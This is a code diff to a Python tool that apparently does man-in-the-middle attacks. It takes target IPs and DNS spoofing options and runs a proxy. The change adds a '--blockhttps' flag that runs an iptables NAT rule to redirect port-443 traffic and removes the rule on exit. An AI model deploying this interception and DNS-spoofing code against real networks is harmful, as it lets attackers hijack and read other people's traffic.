@@ -12,6 +12,8 @@ def main(argv) -> None:
     parser.add_argument('-i', '--interface', type=str, required=False, help='The interface to use')
     parser.add_argument('-t', '--target', type=str, required=False, help='The ip address of the target')
     parser.add_argument('-r', '--range', type=str, required=False, help='The ip range to scan over, alternative to --target')
+    parser.add_argument('-b', '--blockhttps', type=int, required=False, help='Block HTTPS requests..........')
+    # DNS Spoofing
     parser.add_argument('-d', '--domain', type=str, required=False, help='A target domain to spoof DNS requests for. This will enable DNS spoofing.')
     parser.add_argument('-n', '--newip', type=str, required=False, help='If DNS spoofing is enabled (see --domain), then DNS requests for domain -d will be spoofed towards this IPv4 address.')
     parser.add_argument('--newip6', type=str, required=False, help='If DNS spoofing is enabled (see --domain), then DNS requests for domain -d will be spoofed towards this IPv6 address.')
@@ -65,6 +67,9 @@ def main(argv) -> None:
     proxy_server: ProxyServer = ProxyServer()
     proxy_server.start()
 
+    if int(args.blockhttps) == 1:
+        os.system(f'iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT')
+
     try:
         while True:
             pass
@@ -74,6 +79,8 @@ def main(argv) -> None:
         if args.domain:
             dns_spoofer.stop()
         proxy_server.stop()
+        if int(args.blockhttps) == 1:
+            os.system(f'iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT')
 
 
     while True:
